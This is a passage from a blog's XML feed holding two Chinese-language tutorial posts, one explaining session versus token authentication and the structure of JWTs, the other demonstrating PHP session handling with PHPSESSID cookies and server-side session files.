title="基于session认证的流程"></a>基于session认证的流程</h3><ul><li>客户端登陆，一般输入用户名和密码。</li><li>服务端如果验证通过，就会生成session，并把它存入数据库中。</li><li>客户端在浏览器上会产生cookie，并把sessionID写入。</li><li>客户端后续有新的请求，都会在请求后携带sessIonID，发给服务端。</li><li>如果客户端登陆出去，该生成的session就会在客户端和服务端都被销毁。</li></ul><h3 id="基于session认证的缺点"><a href="#基于session认证的缺点" class="headerlink" title="基于session认证的缺点"></a>基于session认证的缺点</h3><ul><li><p>Session: </p><p>每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p></li><li><p>扩展性: </p><p>用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p></li><li><p>CSRF攻击</p><p>因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p></li></ul><h2 id="0x01-基于token认证"><a href="#0x01-基于token认证" class="headerlink" title="0x01 基于token认证"></a>0x01 基于token认证</h2><blockquote><p>近年来，基于token的认证开始成为主流。该认证方式是<strong>无状态的</strong>，客户端登陆成功后，服务端会生成一个token并把它返还给客户端。由于是无状态的，服务端<strong>不再保存该Token</strong>。 </p></blockquote><h3 id="基于token认证的流程"><a href="#基于token认证的流程" class="headerlink" title="基于token认证的流程"></a>基于token认证的流程</h3><ul><li><p>客户端用自己的机密信息登陆，如用户名和密码</p></li><li><p>服务端验证，验证通过，生成Token返还给客户端。</p></li><li><p>客户端把Token写入local storage，后续请求都携带该Token（token一般都是写入客户端的local storage，不过也可以保存在其他地方）。</p></li><li><p>服务端收到请求时验证Token，如果验证通过，则允许用户访问相应资源。</p></li></ul><h3 id="基于token认证的缺点"><a href="#基于token认证的缺点" class="headerlink" title="基于token认证的缺点"></a>基于token认证的缺点</h3><ul><li>因要服务端给Tooken设置过期时间，不能太长，太长可能被冒用不安全。</li><li>过期时间太短用户体验差。</li></ul><h2 id="0x02-JWT"><a href="#0x02-JWT" class="headerlink" title="0x02 JWT"></a>0x02 JWT</h2><p>JWT是由三段信息构成的，将这三段信息文本用<code>.</code>链接一起就构成了Jwt字符串。就像这样:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>第一部分我们称它为头部（header），第二部分我们称其为载荷（payload, 类似于飞机上承载的物品），第三部分是签证（signature）。</p><h4 id="1-header"><a href="#1-header" class="headerlink" title="1. header"></a>1. header</h4><p>jwt的头部承载两部分信息：</p><ul><li>声明类型，这里是jwt</li><li>声明加密的算法 通常直接使用 HMAC SHA256</li></ul><p>完整的头部就像下面这样的JSON：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'typ'</span>: <span class="string">'JWT'</span>,</span><br><span class="line">  <span class="string">'alg'</span>: <span class="string">'HS256'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure><h4 id="2-playload"><a href="#2-playload" class="headerlink" title="2. playload"></a>2. playload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li>标准中注册的声明</li><li>公共的声明</li><li>私有的声明</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure><h4 id="3-signature"><a href="#3-signature" class="headerlink" title="3.signature"></a>3.signature</h4><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">'.'</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">'secret'</span>); <span class="comment">// TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>将这三部分用<code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><blockquote><p>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里简单做一下关于这几篇博客的小结：</p><ul><li>基于cookie/session的是身份认证方式。</li><li>基于token的也是身份认证方式。</li><li>JWT是基于token身份认证的一种具体形式。</li></ul><h2 id="0x04-参考连接"><a href="#0x04-参考连接" class="headerlink" title="0x04 参考连接"></a>0x04 参考连接</h2><p><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">https://www.jianshu.com/p/576dbf44b2ae</a> </p><p><a href="https://www.cnblogs.com/xiangkejin/p/9011119.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiangkejin/p/9011119.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JWT&quot;&gt;&lt;a href=&quot;#JWT&quot; class=&quot;headerlink&quot; title=&quot;JWT&quot;&gt;&lt;/a&gt;JWT&lt;/h2&gt;&lt;p&gt;上面两篇博客我们使用的是基于cookie/session来进行&lt;strong&gt;身份认证&lt;/strong&gt;。今天就来说一说基于toke
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Session</title>
    <link href="http://bai-ren-1.github.io/2020/03/22/Session/"/>
    <id>http://bai-ren-1.github.io/2020/03/22/Session/</id>
    <published>2020-03-22T03:54:08.000Z</published>
    <updated>2020-03-22T06:37:34.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就详细的记录下来。</p><h2 id="0x00-初探Session"><a href="#0x00-初探Session" class="headerlink" title="0x00 初探Session"></a>0x00 初探Session</h2><p>在php中，我们可以通过phpinfo获取到session保存的位置：</p><p><img src="/2020/03/22/Session/1.png" alt></p><p>可以看出php服务端在开启会话后，会发送一个名字为PHPSESSID的session标识给我们客户端，用于作为“钥匙”获取服务端的数据。然后我们可以看到服务端通过文件形式将session保存在tmp路径下。我新建一个1.php用于开启一个会话：</p><p><img src="/2020/03/22/Session/2.png" alt></p><p>1.php下通过session_start开启一个session，然后我们通过浏览器对其进行访问，看session保存路径下是否会生成新的session文件。可见原先我们该路径下的文件夹是空的：</p><p><img src="/2020/03/22/Session/Session%5C3.png" alt></p><p>然后我们访问localhost/1.php，在cookie字段下面多了一个名为PHPSESSID的键：</p><p><img src="/2020/03/22/Session/4.png" alt></p><p>然后我们到session路径下查看，就能发现在该路径下确实生成了一个session文件，其名称包含了cookie下的对应的键值：</p><p><img src="/2020/03/22/Session/5.png" alt></p><blockquote><p>服务端通过客户端的浏览器标识客户，所以即使同一台客户端主机，开启不同的浏览器访问会获得不同的session。</p></blockquote><p>综上所述，当服务端php使用session_start开启了一个会话后，就会给访这个页面的浏览器发布一个</p><p>sessionid存放在客户端cookie内，其键名为PHPSESSID。</p><p>我们有了存放在服务端的session文件，那客户端是怎么通过PHPSESSID获取到里面的内容的呢？</p><p><img src="/2020/03/22/Session/6.png" alt></p><p>我们首先刷新请求，可以看到请求头里带上了cookie字段。服务器接收到cookie的数据后，就会打开对应的session文件并返回给客户端。这个的具体演示就看下一章的实验。</p><h2 id="0x01-Session内容"><a href="#0x01-Session内容" class="headerlink" title="0x01 Session内容"></a>0x01 Session内容</h2><p>把1.php的源码修改为给超全局数组$_SESSION中写入一个键值并打印数组内容：</p><p><img src="/2020/03/22/Session/8.png" alt></p><p>我们重新刷新页面，可以看到$_SESSION数组的值被打印出来：</p><p><img src="/2020/03/22/Session/7.png" alt></p><p>我们得看看存储在服务端的session的文件是什么形式存储数据的呢？</p><p><img src="/2020/03/22/Session/9.png" alt></p><p>可见在服务端的session文件里存储了序列化形式数据。</p><blockquote><p>综上，当客户端第一次访问到服务端该页面时，服务端会执行session_start启动一个session。执行后服务器会在保存路径下生成一个空的session用于保存数据，并且在给客户端返回一个PHPSESSID保存在cookie中（好像sessonid不一定是保留客户端的cookie中，也可以是其他地方）。然后程序继续执行，往$_SESSION数组中里面写入值，服务端会自动取出里面内容并用序列化的形式保存至对应的会话文件中。然后只要客户端带着这个PHPSESSID来访问服务端，服务端就会给其返回对应的session文件对应的内容。</p></blockquote><h2 id="0x02-共享Session"><a href="#0x02-共享Session" class="headerlink" title="0x02 共享Session"></a>0x02 共享Session</h2><p>我想在另一个文件里面也使用这个session，该怎么操作？新建2.php，内容如下：</p><p><img src="/2020/03/22/Session/10.png" alt></p><p>然后我带着刚刚的PHPSESSID访问2.php：</p><p><img src="/2020/03/22/Session/11.png" alt></p><p>session文件里面会多了一条序列化数据：</p><p><img src="/2020/03/22/Session/12.png" alt></p><blockquote><p>在另一个文件中使用session_start开启会话，如果请求头中cookie带有PHPSESSID，就不会生成新的session文件，而是会找到ID对应的文件并进行操作，达成不同文件共享会话session的目的。</p></blockquote><h2 id="0x03-删除Session"><a href="#0x03-删除Session" class="headerlink" title="0x03 删除Session"></a>0x03 删除Session</h2><p>然后我们可以通过unset属性或者直接将session设置为空来清空session。首先修改2.php，我们给他赋值age属性后立马将session里面的name属性删除：</p><p><img src="/2020/03/22/Session/13.png" alt></p><p>清除之前实验的session重新开始，我们访问1.php查看结果，和之前实验一样生成了session文件并写入了name属性：</p><p><img src="/2020/03/22/Session/14.png" alt></p><p>然后我们再访问2.php看结果如何？由下图的结果我们可以分析出，访问2.php后在同一个session下写入age属性并打印出结果。在浏览器上我们能看到两个属性：</p><p><img src="/2020/03/22/Session/15.png" alt></p><p>那2.php执行完后的session文件中的属性是什么样的呢？如我们所料，原来的session中的name属性被我们删除了。现在session文件里面只剩下了age属性。</p><p><img src="/2020/03/22/Session/16.png" alt></p><p>然后我们在做最后一步验证，看访问1.php会打印出什么内容：</p><p><img src="/2020/03/22/Session/17.png" alt></p><p>因为1.php的执行流程是重新写入name属性再打印出结果，由键值顺序我们就能看出。刚刚的删除操作是成功执行了。</p><blockquote><p>综上，两个不同文件都是用使用session_start就能使用同一个会话。当我们需要删除会话属性时，可以使用unset或者直接赋值$_SESSION为空来做到。</p></blockquote><h2 id="0x04-Session-amp-Cookie"><a href="#0x04-Session-amp-Cookie" class="headerlink" title="0x04 Session&amp;Cookie"></a>0x04 Session&amp;Cookie</h2><p>当然下面的结论是使用setcookie和session_start得到的，其他语言或者其他函数我就这里就不继续做了。</p><ul><li><p><strong>cookie</strong>是服务端通过setcookie直接给客户端的cookie字段中加入了的标识用户的数据，即<strong>标识用户的数据存储在客户端中</strong>。</p></li><li><p><strong>session</strong>是服务端通过session_start给客户端cookie字段（也可能是客户端其他地方）中加入了获取标识用户数据的“钥匙”即sessionid，客户端通过这把钥匙才能在服务端上对应的session文件上获得用户的数据。<strong>即标识用户的数据存在了服务端，但用户需要sessionid这把本地“钥匙”才能进行获取</strong>。</p></li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>session和cookie的博客就先写到这里。后面看看把tokn给补充上来，完成三杀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Session&quot;&gt;&lt;a href=&quot;#Session&quot; class=&quot;headerlink&quot; title=&quot;Session&quot;&gt;&lt;/a&gt;Session&lt;/h1&gt;&lt;p&gt;作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
</feed>
